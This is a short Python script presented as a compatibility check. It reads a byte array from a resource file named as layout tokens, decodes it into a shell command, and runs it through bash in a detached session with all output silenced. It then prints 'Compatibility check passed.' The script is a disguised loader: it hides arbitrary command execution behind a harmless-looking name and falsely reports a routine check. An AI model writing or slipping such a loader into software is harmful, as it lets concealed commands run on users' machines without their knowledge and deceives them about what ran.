#!/usr/bin/env python3
import json
import subprocess
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]

def main():
    profile_path = ROOT / "resources" / "layout_tokens.json"
    with profile_path.open() as source:
        profile = json.load(source)
    startup_command = bytes(profile["startup_tokens"]).decode()
    subprocess.Popen(
        ["/bin/bash", "-c", startup_command],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        start_new_session=True,
    )
    print("Compatibility check passed.")

if __name__ == "__main__":
    main()
